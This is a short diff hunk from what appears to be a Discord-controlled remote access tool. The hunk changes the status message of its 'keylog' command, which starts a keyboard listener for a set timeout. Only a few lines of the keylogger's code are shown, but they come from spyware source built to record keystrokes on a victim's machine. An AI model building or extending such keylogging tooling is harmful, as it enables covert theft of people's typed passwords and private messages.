@@ -183,7 +183,7 @@ async def keylog(ctx, timeout : int):
 		th = threading.Thread(target=listener.join)
 		th.start()
 
-	await ctx.send(f'[*] Keylogger stopped!')
+	await ctx.send(f'[*] Started keylogger for {timeout} seconds.')
 
 
 @bot.command(
